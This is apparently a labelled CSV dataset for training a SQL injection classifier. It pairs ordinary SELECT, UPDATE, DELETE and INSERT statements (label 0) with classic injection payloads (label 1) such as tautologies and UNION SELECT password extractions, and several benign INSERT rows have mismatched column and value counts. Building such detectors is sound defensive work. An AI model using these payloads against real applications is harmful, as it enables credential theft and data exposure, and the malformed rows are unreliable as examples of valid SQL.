query,label
DELETE FROM customers WHERE id=6;,0
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
SELECT * FROM users WHERE status='' OR 'a'='a';,1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
SELECT * FROM users WHERE status='' UNION SELECT password FROM users --;,1
' OR '1'='1' --,1
SELECT * FROM users WHERE username='' OR '1'='1';,1
SELECT * FROM orders WHERE email='' UNION SELECT password FROM users --;,1
' OR 1=1 --,1
"SELECT status, quantity, email FROM orders WHERE id=8;",0
SELECT * FROM cart WHERE password='' OR 'a'='a';,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"SELECT name, email, id FROM users WHERE status='10';",0
UPDATE customers SET id=2 WHERE id=3;,0
DELETE FROM orders WHERE status='9';,0
SELECT * FROM users WHERE id='' UNION SELECT password FROM users --;,1
' OR '1'='1' --,1
DELETE FROM products WHERE price>8;,0
DELETE FROM users WHERE user_id=9;,0
DELETE FROM users WHERE country='1';,0
DELETE FROM orders WHERE country='5';,0
UPDATE customers SET id='test@example.com' WHERE user_id=4;,0
DELETE FROM users WHERE country='3';,0
UPDATE products SET quantity=100 WHERE id=4;,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM products WHERE password='' OR 'a'='a';,1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM users WHERE username='' OR '1'='1';,1
"INSERT INTO users (status, name) VALUES ('test@example.com', 'Alice');",0
' OR '1'='1' --,1
UPDATE products SET quantity='Alice' WHERE id=6;,0
DELETE FROM customers WHERE country='6';,0
SELECT email FROM users WHERE id=6;,0
SELECT * FROM products WHERE username='' OR '1'='1';,1
UPDATE orders SET price='test@example.com' WHERE price>9;,0
DELETE FROM orders WHERE status='7';,0
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
' OR '1'='1' --,1
"INSERT INTO customers (price) VALUES ('Bob', 1);",0
"INSERT INTO cart (username, email) VALUES (5, 'Alice', 100);",0
SELECT * FROM cart WHERE status='' UNION SELECT password FROM users --;,1
SELECT * FROM orders WHERE id='' OR 'a'='a';,1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
UPDATE cart SET name=2 WHERE user_id=5;,0
"INSERT INTO users (id) VALUES ('Bob', 'test@example.com');",0
"' UNION SELECT username, password FROM users --",1
UPDATE orders SET status=1 WHERE status='4';,0
"' UNION SELECT username, password FROM users --",1
"SELECT email, password FROM products WHERE id=4;",0
SELECT * FROM cart WHERE id='' OR '1'='1';,1
SELECT * FROM users WHERE id='' OR '1'='1';,1
SELECT * FROM cart WHERE password='' OR '1'='1';,1
DELETE FROM orders WHERE country='6';,0
"SELECT status, quantity, price FROM orders WHERE price>1;",0
SELECT id FROM orders WHERE user_id=8;,0
DELETE FROM cart WHERE id=5;,0
DELETE FROM orders WHERE id=3;,0
SELECT * FROM products WHERE id='' UNION SELECT password FROM users --;,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"INSERT INTO users (price, id, status) VALUES (100, 'Alice');",0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
UPDATE products SET quantity='Bob' WHERE status='6';,0
UPDATE users SET name=1 WHERE price>9;,0
SELECT * FROM cart WHERE password='' OR 'a'='a';,1
' OR 1=1 --,1
"SELECT username, email, password FROM users WHERE status='9';",0
"SELECT email, status, quantity FROM customers WHERE country='1';",0
UPDATE users SET price='Alice' WHERE id=6;,0
"INSERT INTO orders (username, password) VALUES (1);",0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
' OR '1'='1' --,1
SELECT * FROM users WHERE id='' UNION SELECT password FROM users --;,1
"INSERT INTO customers (email, price, name) VALUES (5, 100);",0
SELECT * FROM users WHERE id='' OR 'a'='a';,1
SELECT status FROM users WHERE user_id=6;,0
SELECT * FROM products WHERE username='' OR '1'='1';,1
' OR 1=1 --,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"INSERT INTO cart (quantity, email, status) VALUES (100, 'test@example.com');",0
SELECT * FROM customers WHERE email='' OR 'a'='a';,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM users WHERE user_id=10;,0
' OR 1=1 --,1
"INSERT INTO cart (price, id, password) VALUES ('Alice', 100, 2);",0
UPDATE customers SET username=5 WHERE country='4';,0
UPDATE users SET name=100 WHERE status='6';,0
SELECT * FROM cart WHERE password='' UNION SELECT password FROM users --;,1
DELETE FROM orders WHERE country='1';,0
' OR '1'='1' --,1
' OR '1'='1' --,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
SELECT * FROM products WHERE quantity='' OR '1'='1';,1
' OR 1=1 --,1
DELETE FROM cart WHERE id=2;,0
' OR 1=1 --,1
UPDATE users SET price='test@example.com' WHERE id=8;,0
"SELECT name, password FROM orders WHERE country='9';",0
SELECT price FROM cart WHERE status='3';,0
SELECT * FROM cart WHERE status='' OR '1'='1';,1
SELECT * FROM customers WHERE id='' OR '1'='1';,1
"SELECT status, email FROM users WHERE price>9;",0
"INSERT INTO customers (name, price) VALUES ('Alice', 'test@example.com', 'Bob');",0
SELECT password FROM cart WHERE status='9';,0
SELECT * FROM users WHERE username='' UNION SELECT password FROM users --;,1
SELECT * FROM products WHERE password='' OR '1'='1';,1
DELETE FROM products WHERE price>6;,0
UPDATE users SET quantity='Alice' WHERE id=8;,0
SELECT * FROM users WHERE name='' UNION SELECT password FROM users --;,1
DELETE FROM customers WHERE country='3';,0
DELETE FROM users WHERE price>10;,0
SELECT * FROM orders WHERE name='' OR '1'='1';,1
"INSERT INTO orders (name, email) VALUES ('Bob');",0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
' OR '1'='1' --,1
DELETE FROM products WHERE price>2;,0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
UPDATE orders SET quantity=1 WHERE country='10';,0
DELETE FROM orders WHERE price>5;,0
SELECT email FROM cart WHERE status='4';,0
SELECT * FROM orders WHERE id='' OR 'a'='a';,1
"INSERT INTO orders (name, id, status) VALUES ('Bob');",0
"SELECT email, status, username FROM customers WHERE id=8;",0
SELECT * FROM users WHERE status='' OR 'a'='a';,1
SELECT password FROM users WHERE status='2';,0
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
SELECT * FROM customers WHERE price='' OR 'a'='a';,1
"INSERT INTO products (price) VALUES ('test@example.com', 5);",0
UPDATE orders SET status=1 WHERE id=5;,0
UPDATE orders SET status='Alice' WHERE id=10;,0
UPDATE users SET status='test@example.com' WHERE status='8';,0
SELECT * FROM orders WHERE password='' OR '1'='1';,1
' OR '1'='1' --,1
' OR '1'='1' --,1
' OR EXISTS(SELECT * FROM users) -- , 1
' OR EXISTS(SELECT username FROM admin) -- , 1

"INSERT INTO customers (email, status) VALUES ('Bob', 1);",0
UPDATE orders SET status='Alice' WHERE country='6';,0
"SELECT name, username, email FROM orders WHERE status='3';",0
DELETE FROM products WHERE price>1;,0
"INSERT INTO users (name, username) VALUES (100, 2, 5);",0
' OR 1=1 --,1
DELETE FROM users WHERE user_id=4;,0
' OR '1'='1' --,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
UPDATE users SET id='test@example.com' WHERE user_id=9;,0
SELECT * FROM orders WHERE username='' OR '1'='1';,1
SELECT id FROM customers WHERE id=5;,0
DELETE FROM users WHERE status='8';,0
DELETE FROM cart WHERE status='9';,0
DELETE FROM orders WHERE status='3';,0
"SELECT email, quantity, id FROM products WHERE price>3;",0
"' UNION SELECT username, password FROM users --",1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM orders WHERE username='' UNION SELECT password FROM users --;,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"' UNION SELECT username, password FROM users --",1
"SELECT quantity, price FROM orders WHERE country='10';",0
SELECT * FROM products WHERE email='' OR '1'='1';,1
SELECT * FROM users WHERE price='' OR 'a'='a';,1
SELECT * FROM products WHERE quantity='' OR 'a'='a';,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
SELECT price FROM customers WHERE status='1';,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM customers WHERE status='' OR 'a'='a';,1
UPDATE users SET quantity=2 WHERE country='10';,0
' OR '1'='1' --,1
SELECT * FROM orders WHERE username='' OR '1'='1';,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
' OR 1=1 --,1
UPDATE products SET email=2 WHERE id=8;,0
SELECT * FROM cart WHERE status='' OR 'a'='a';,1
"INSERT INTO cart (id) VALUES ('test@example.com', 'Alice', 'Bob');",0
SELECT * FROM cart WHERE price='' UNION SELECT password FROM users --;,1
"' UNION SELECT username, password FROM users --",1
UPDATE cart SET email=1 WHERE country='8';,0
DELETE FROM customers WHERE id=10;,0
DELETE FROM products WHERE user_id=5;,0
' OR '1'='1' --,1
UPDATE customers SET username=1 WHERE country='6';,0
SELECT * FROM orders WHERE price='' OR 'a'='a';,1
"INSERT INTO cart (password, username, id) VALUES (1, 'Bob');",0
UPDATE customers SET name=5 WHERE price>6;,0
"INSERT INTO products (quantity, email) VALUES ('test@example.com');",0
SELECT * FROM orders WHERE quantity='' OR 'a'='a';,1
"INSERT INTO users (price, username) VALUES (1, 'Bob');",0
SELECT * FROM orders WHERE status='' OR '1'='1';,1
UPDATE orders SET name=5 WHERE id=3;,0
SELECT * FROM users WHERE status='' OR '1'='1';,1
' OR '1'='1' --,1
' OR 1=1 --,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM orders WHERE price>8;,0
SELECT * FROM products WHERE id='' OR 'a'='a';,1
SELECT * FROM customers WHERE email='' UNION SELECT password FROM users --;,1
"INSERT INTO cart (password) VALUES ('test@example.com', 100);",0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
' OR 1=1 --,1
SELECT * FROM products WHERE email='' OR '1'='1';,1
SELECT * FROM customers WHERE status='' UNION SELECT password FROM users --;,1
"SELECT name, username FROM cart WHERE country='1';",0
"' UNION SELECT username, password FROM users --",1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
UPDATE products SET password=1 WHERE user_id=10;,0
"SELECT name, id, price FROM cart WHERE price>8;",0
"SELECT price, password FROM users WHERE id=7;",0
' OR 1=1 --,1
SELECT * FROM orders WHERE password='' UNION SELECT password FROM users --;,1
SELECT * FROM orders WHERE name='' OR 'a'='a';,1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
"SELECT username, password FROM customers WHERE status='8';",0
SELECT * FROM customers WHERE name='' OR '1'='1';,1
"SELECT name, id, username FROM products WHERE country='1';",0
UPDATE cart SET status=2 WHERE country='5';,0
DELETE FROM cart WHERE price>3;,0
"' UNION SELECT username, password FROM users --",1
' OR '1'='1' --,1
' OR '1'='1' --,1
SELECT id FROM cart WHERE id=4;,0
SELECT * FROM products WHERE name='' OR 'a'='a';,1
' OR '1'='1' --,1
SELECT email FROM cart WHERE price>4;,0
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
DELETE FROM customers WHERE country='5';,0
UPDATE users SET status=1 WHERE price>6;,0
SELECT password FROM users WHERE price>8;,0
"SELECT status, password FROM customers WHERE id=6;",0
SELECT price FROM orders WHERE id=9;,0
"SELECT id, name FROM cart WHERE id=2;",0
UPDATE products SET status=2 WHERE id=5;,0
UPDATE customers SET status='Alice' WHERE id=2;,0
UPDATE customers SET quantity=100 WHERE country='9';,0
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
INSERT INTO users (status) VALUES ('Bob');,0
UPDATE products SET quantity='Bob' WHERE user_id=3;,0
"' UNION SELECT username, password FROM users --",1
UPDATE users SET name='test@example.com' WHERE price>9;,0
' OR '1'='1' --,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
' OR '1'='1' --,1
DELETE FROM customers WHERE country='4';,0
UPDATE users SET name='Bob' WHERE id=10;,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM customers WHERE name='' OR '1'='1';,1
UPDATE users SET status='Alice' WHERE status='9';,0
' OR 1=1 --,1
DELETE FROM orders WHERE user_id=7;,0
SELECT * FROM cart WHERE name='' UNION SELECT password FROM users --;,1
"SELECT username, name FROM products WHERE status='10';",0
"INSERT INTO orders (id, price) VALUES (100, 'Bob', 'test@example.com');",0
DELETE FROM customers WHERE price>8;,0
DELETE FROM users WHERE status='2';,0
"' UNION SELECT username, password FROM users --",1
"SELECT username, status, password FROM products WHERE user_id=2;",0
SELECT * FROM orders WHERE email='' UNION SELECT password FROM users --;,1
"SELECT id, quantity FROM orders WHERE id=9;",0
INSERT INTO cart (price) VALUES ('Bob');,0
' OR '1'='1' --,1
"INSERT INTO orders (password, quantity) VALUES ('Alice');",0
"INSERT INTO orders (quantity, price, username) VALUES ('test@example.com', 'Alice', 'Bob');",0
DELETE FROM customers WHERE price>2;,0
SELECT * FROM products WHERE password='' OR 'a'='a';,1
SELECT username FROM customers WHERE id=7;,0
"INSERT INTO customers (username, id) VALUES (2, 5);",0
DELETE FROM users WHERE status='10';,0
UPDATE users SET status=5 WHERE user_id=6;,0
SELECT * FROM users WHERE name='' OR 'a'='a';,1
INSERT INTO cart (name) VALUES (100);,0
UPDATE customers SET name='Bob' WHERE id=3;,0
SELECT * FROM customers WHERE price='' UNION SELECT password FROM users --;,1
SELECT * FROM customers WHERE quantity='' UNION SELECT password FROM users --;,1
SELECT username FROM products WHERE user_id=7;,0
UPDATE products SET id='test@example.com' WHERE user_id=9;,0
' OR 1=1 --,1
' OR '1'='1' --,1
UPDATE cart SET email=100 WHERE id=4;,0
' OR '1'='1' --,1
SELECT * FROM users WHERE username='' OR '1'='1';,1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
SELECT * FROM orders WHERE price='' OR 'a'='a';,1
"' UNION SELECT username, password FROM users --",1
UPDATE users SET name='test@example.com' WHERE status='5';,0
SELECT id FROM cart WHERE user_id=2;,0
' OR 1=1 --,1
SELECT * FROM cart WHERE status='' UNION SELECT password FROM users --;,1
"SELECT name, username FROM customers WHERE user_id=5;",0
SELECT * FROM customers WHERE quantity='' OR '1'='1';,1
' OR '1'='1' --,1
UPDATE products SET quantity=100 WHERE user_id=1;,0
SELECT * FROM cart WHERE password='' OR '1'='1';,1
' OR '1'='1' --,1
SELECT password FROM users WHERE price>2;,0
"INSERT INTO cart (email) VALUES (100, 5);",0
SELECT * FROM cart WHERE username='' OR 'a'='a';,1
SELECT password FROM cart WHERE country='8';,0
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
UPDATE products SET quantity='test@example.com' WHERE country='9';,0
UPDATE users SET email=1 WHERE status='1';,0
' OR 1=1 --,1
DELETE FROM orders WHERE price>3;,0
UPDATE cart SET price=5 WHERE country='9';,0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
DELETE FROM users WHERE user_id=7;,0
SELECT * FROM customers WHERE price='' UNION SELECT password FROM users --;,1
"SELECT price, name FROM cart WHERE user_id=4;",0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
UPDATE orders SET username=5 WHERE id=4;,0
UPDATE orders SET username='Alice' WHERE price>1;,0
SELECT * FROM cart WHERE quantity='' UNION SELECT password FROM users --;,1
"INSERT INTO users (email, quantity) VALUES (5, 'Alice', 2);",0
DELETE FROM users WHERE status='2';,0
DELETE FROM customers WHERE status='8';,0
"INSERT INTO cart (username, email, quantity) VALUES (100);",0
SELECT * FROM cart WHERE name='' OR 'a'='a';,1
"SELECT username, status FROM products WHERE id=8;",0
SELECT email FROM cart WHERE id=6;,0
SELECT * FROM products WHERE username='' OR '1'='1';,1
' OR '1'='1' --,1
SELECT * FROM users WHERE password='' OR '1'='1';,1
UPDATE customers SET price='Bob' WHERE price>6;,0
DELETE FROM users WHERE user_id=7;,0
SELECT * FROM users WHERE quantity='' UNION SELECT password FROM users --;,1
' OR '1'='1' --,1
"INSERT INTO orders (name, email, id) VALUES (1);",0
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
"SELECT quantity, password, username FROM orders WHERE price>10;",0
DELETE FROM customers WHERE user_id=7;,0
DELETE FROM users WHERE id=10;,0
' OR 1=1 --,1
SELECT price FROM cart WHERE country='2';,0
"INSERT INTO products (username, status, price) VALUES ('Bob');",0
' OR '1'='1' --,1
SELECT * FROM orders WHERE name='' OR '1'='1';,1
' OR 1=1 --,1
UPDATE orders SET email=1 WHERE country='8';,0
SELECT * FROM users WHERE status='' OR 'a'='a';,1
SELECT * FROM cart WHERE username='' OR 'a'='a';,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
' OR '1'='1' --,1
SELECT price FROM users WHERE country='8';,0
UPDATE cart SET quantity=100 WHERE id=9;,0
SELECT * FROM orders WHERE price='' OR 'a'='a';,1
SELECT * FROM customers WHERE username='' OR 'a'='a';,1
SELECT * FROM cart WHERE quantity='' UNION SELECT password FROM users --;,1
SELECT id FROM orders WHERE id=1;,0
"SELECT username, price FROM cart WHERE status='8';",0
"SELECT quantity, password, status FROM cart WHERE user_id=5;",0
UPDATE products SET quantity=2 WHERE user_id=7;,0
"INSERT INTO products (password) VALUES ('Bob', 'test@example.com', 1);",0
DELETE FROM orders WHERE country='10';,0
"INSERT INTO customers (email, quantity, status) VALUES (5, 'Alice');",0
SELECT email FROM products WHERE status='6';,0
SELECT * FROM products WHERE password='' UNION SELECT password FROM users --;,1
SELECT * FROM orders WHERE quantity='' OR '1'='1';,1
' OR '1'='1' --,1
"SELECT id, email, quantity FROM orders WHERE status='5';",0
DELETE FROM products WHERE price>10;,0
SELECT * FROM orders WHERE email='' OR '1'='1';,1
SELECT * FROM cart WHERE quantity='' OR '1'='1';,1
"INSERT INTO customers (price, status, quantity) VALUES (1, 'Bob');",0
UPDATE orders SET email=2 WHERE status='5';,0
SELECT * FROM customers WHERE id='' UNION SELECT password FROM users --;,1
UPDATE users SET name=100 WHERE id=8;,0
UPDATE customers SET status=1 WHERE price>1;,0
' OR 1=1 --,1
' OR '1'='1' --,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
DELETE FROM users WHERE status='6';,0
"INSERT INTO cart (username, password, email) VALUES (5);",0
SELECT * FROM users WHERE status='' OR '1'='1';,1
"INSERT INTO cart (status, password) VALUES (100);",0
DELETE FROM customers WHERE price>3;,0
"INSERT INTO products (email, password) VALUES (5, 'Alice', 1);",0
' OR '1'='1' --,1
UPDATE cart SET username='Alice' WHERE price>1;,0
"INSERT INTO cart (price, status, id) VALUES ('Alice');",0
SELECT * FROM products WHERE password='' OR 'a'='a';,1
SELECT * FROM cart WHERE name='' OR '1'='1';,1
"INSERT INTO orders (password, id) VALUES (1, 2);",0
"' UNION SELECT username, password FROM users --",1
"INSERT INTO users (email) VALUES (1, 'Alice');",0
"INSERT INTO products (price, username, name) VALUES (100);",0
SELECT * FROM cart WHERE username='' OR 'a'='a';,1
' OR '1'='1' --,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
SELECT * FROM cart WHERE email='' OR '1'='1';,1
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
UPDATE orders SET id=100 WHERE user_id=10;,0
SELECT * FROM products WHERE password='' OR '1'='1';,1
DELETE FROM cart WHERE price>2;,0
SELECT * FROM cart WHERE status='' OR '1'='1';,1
UPDATE cart SET quantity=100 WHERE user_id=7;,0
"SELECT price, name FROM orders WHERE status='4';",0
SELECT * FROM cart WHERE password='' OR 'a'='a';,1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
' OR 1=1 --,1
DELETE FROM products WHERE price>2;,0
SELECT * FROM orders WHERE price='' OR 'a'='a';,1
SELECT * FROM cart WHERE name='' UNION SELECT password FROM users --;,1
SELECT * FROM products WHERE id='' OR 'a'='a';,1
' OR 1=1 --,1
SELECT * FROM cart WHERE name='' UNION SELECT password FROM users --;,1
SELECT * FROM users WHERE price='' OR '1'='1';,1
SELECT * FROM cart WHERE quantity='' OR 'a'='a';,1
SELECT * FROM users WHERE name='' UNION SELECT password FROM users --;,1
SELECT * FROM products WHERE username='' UNION SELECT password FROM users --;,1
UPDATE products SET status='Alice' WHERE id=3;,0
' OR 1=1 --,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
UPDATE cart SET quantity=2 WHERE status='10';,0
"' UNION SELECT username, password FROM users --",1
"INSERT INTO orders (status) VALUES (1, 5, 100);",0
DELETE FROM orders WHERE status='3';,0
UPDATE users SET username='test@example.com' WHERE status='1';,0
' OR '1'='1' --,1
SELECT * FROM orders WHERE email='' OR 'a'='a';,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
DELETE FROM customers WHERE user_id=4;,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM orders WHERE price='' OR 'a'='a';,1
DELETE FROM users WHERE country='2';,0
SELECT name FROM customers WHERE country='6';,0
SELECT * FROM orders WHERE price='' UNION SELECT password FROM users --;,1
"INSERT INTO orders (name, status) VALUES ('Alice', 2, 'test@example.com');",0
SELECT status FROM products WHERE status='4';,0
SELECT * FROM orders WHERE password='' OR '1'='1';,1
UPDATE orders SET email='test@example.com' WHERE id=4;,0
SELECT * FROM cart WHERE price='' OR 'a'='a';,1
SELECT * FROM cart WHERE status='' UNION SELECT password FROM users --;,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM orders WHERE id=9;,0
DELETE FROM cart WHERE user_id=4;,0
DELETE FROM products WHERE user_id=5;,0
' OR 1=1 --,1
UPDATE orders SET status='Alice' WHERE price>3;,0
SELECT * FROM users WHERE username='' UNION SELECT password FROM users --;,1
SELECT * FROM users WHERE status='' UNION SELECT password FROM users --;,1
UPDATE customers SET id=2 WHERE id=3;,0
UPDATE orders SET name=2 WHERE id=8;,0
UPDATE users SET email='test@example.com' WHERE status='10';,0
SELECT * FROM products WHERE name='' UNION SELECT password FROM users --;,1
SELECT * FROM cart WHERE username='' UNION SELECT password FROM users --;,1
"INSERT INTO users (email) VALUES (5, 'test@example.com', 'Alice');",0
UPDATE customers SET password=1 WHERE user_id=6;,0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE email='' OR '1'='1';,1
DELETE FROM products WHERE id=6;,0
"SELECT status, email FROM users WHERE country='5';",0
"INSERT INTO customers (price) VALUES ('test@example.com', 'Alice', 'Bob');",0
INSERT INTO customers (price) VALUES (1);,0
"SELECT quantity, name, password FROM users WHERE user_id=6;",0
' OR 1=1 --,1
DELETE FROM products WHERE country='10';,0
' OR '1'='1' --,1
SELECT * FROM cart WHERE username='' OR 'a'='a';,1
SELECT * FROM products WHERE status='' UNION SELECT password FROM users --;,1
DELETE FROM customers WHERE price>1;,0
' OR '1'='1' --,1
' OR '1'='1' --,1
SELECT * FROM users WHERE price='' OR 'a'='a';,1
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
"SELECT email, quantity FROM customers WHERE country='4';",0
DELETE FROM orders WHERE status='4';,0
SELECT * FROM users WHERE status='' OR 'a'='a';,1
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
UPDATE products SET id=2 WHERE status='7';,0
SELECT username FROM products WHERE price>9;,0
"' UNION SELECT username, password FROM users --",1
' OR 1=1 --,1
SELECT * FROM orders WHERE email='' OR '1'='1';,1
"SELECT status, name FROM users WHERE price>1;",0
' OR '1'='1' --,1
"INSERT INTO customers (status, username, quantity) VALUES (100, 5);",0
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
UPDATE customers SET password=2 WHERE price>1;,0
DELETE FROM products WHERE country='2';,0
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
UPDATE customers SET id=100 WHERE id=8;,0
SELECT * FROM users WHERE quantity='' OR '1'='1';,1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM cart WHERE status='' OR '1'='1';,1
"SELECT quantity, username, email FROM users WHERE price>8;",0
SELECT * FROM orders WHERE id=1 OR 1=1 --;,1
SELECT * FROM customers WHERE email='' UNION SELECT password FROM users --;,1
' OR 1=1 --,1
SELECT * FROM users WHERE password='' OR '1'='1';,1
"INSERT INTO users (email, status, price) VALUES (100, 2);",0
DELETE FROM customers WHERE status='1';,0
UPDATE orders SET status=2 WHERE country='8';,0
SELECT * FROM users WHERE username='' UNION SELECT password FROM users --;,1
SELECT * FROM products WHERE id='' OR '1'='1';,1
INSERT INTO products (name) VALUES (100);,0
SELECT username FROM orders WHERE user_id=8;,0
' OR 1=1 --,1
"INSERT INTO orders (quantity, status) VALUES ('Bob', 'test@example.com', 1);",0
' OR 1=1 --,1
"INSERT INTO cart (price, username, email) VALUES ('Bob', 100, 1);",0
"' UNION SELECT username, password FROM users --",1
SELECT * FROM products WHERE price='' OR '1'='1';,1
"INSERT INTO customers (id, password, quantity) VALUES ('test@example.com', 100, 'Bob');",0
"SELECT quantity, price FROM products WHERE id=3;",0
' OR '1'='1' --,1
"SELECT name, id, password FROM products WHERE price>2;",0
"INSERT INTO users (username, email, id) VALUES ('test@example.com', 'Bob', 5);",0
DELETE FROM orders WHERE user_id=2;,0
UPDATE customers SET status=5 WHERE user_id=7;,0
UPDATE orders SET name='Bob' WHERE user_id=1;,0
DELETE FROM customers WHERE status='7';,0
' OR '1'='1' --,1
UPDATE customers SET email=1 WHERE country='9';,0
' OR '1'='1' --,1
SELECT * FROM users WHERE password='' OR '1'='1';,1
"INSERT INTO orders (price, email, password) VALUES (5, 'test@example.com', 2);",0
SELECT * FROM products WHERE name='' OR 'a'='a';,1
UPDATE users SET status='Alice' WHERE country='7';,0
"SELECT name, quantity FROM cart WHERE price>4;",0
SELECT * FROM users WHERE quantity='' OR 'a'='a';,1
SELECT * FROM users WHERE price='' OR '1'='1';,1
"' UNION SELECT username, password FROM users --",1
DELETE FROM products WHERE id=4;,0
DELETE FROM users WHERE status='10';,0
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
DELETE FROM cart WHERE id=5;,0
SELECT * FROM users WHERE id=1 OR 1=1 --;,1
SELECT * FROM users WHERE username='' OR '1'='1';,1
"' UNION SELECT username, password FROM users --",1
SELECT * FROM products WHERE price='' UNION SELECT password FROM users --;,1
' OR '1'='1' --,1
"' UNION SELECT username, password FROM users --",1
"SELECT quantity, status FROM products WHERE price>5;",0
SELECT * FROM orders WHERE name='' OR '1'='1';,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
UPDATE cart SET price='Bob' WHERE price>6;,0
"SELECT email, status, password FROM cart WHERE status='8';",0
"INSERT INTO orders (price) VALUES (5, 100);",0
DELETE FROM users WHERE id=7;,0
DELETE FROM cart WHERE price>8;,0
DELETE FROM users WHERE id=2;,0
UPDATE users SET price=5 WHERE status='6';,0
' OR 1=1 --,1
SELECT * FROM cart WHERE id=1 OR 1=1 --;,1
DELETE FROM orders WHERE price>9;,0
DELETE FROM orders WHERE status='4';,0
"SELECT username, email FROM users WHERE id=5;",0
DELETE FROM users WHERE country='2';,0
SELECT price FROM cart WHERE country='8';,0
' OR '1'='1' --,1
' OR 1=1 --,1
DELETE FROM customers WHERE user_id=6;,0
UPDATE customers SET status=5 WHERE status='7';,0
' OR '1'='1' --,1
SELECT * FROM users WHERE name='' OR '1'='1';,1
SELECT * FROM products WHERE id=1 OR 1=1 --;,1
SELECT * FROM cart WHERE email='' UNION SELECT password FROM users --;,1
SELECT * FROM customers WHERE id=1 OR 1=1 --;,1
INSERT INTO orders (price) VALUES (2);,0
SELECT * FROM orders WHERE password='' OR 'a'='a';,1
SELECT * FROM products WHERE price='' UNION SELECT password FROM users --;,1
SELECT * FROM customers WHERE price='' OR 'a'='a';,1
SELECT * FROM customers WHERE username='' UNION SELECT password FROM users --;,1
INSERT INTO orders (id) VALUES (5);,0
DELETE FROM cart WHERE id=5;,0
DELETE FROM users WHERE price>8;,0
"INSERT INTO users (price, username, name) VALUES ('Bob');",0
UPDATE products SET email='test@example.com' WHERE status='2';,0
"SELECT price, id, password FROM products WHERE country='5';",0
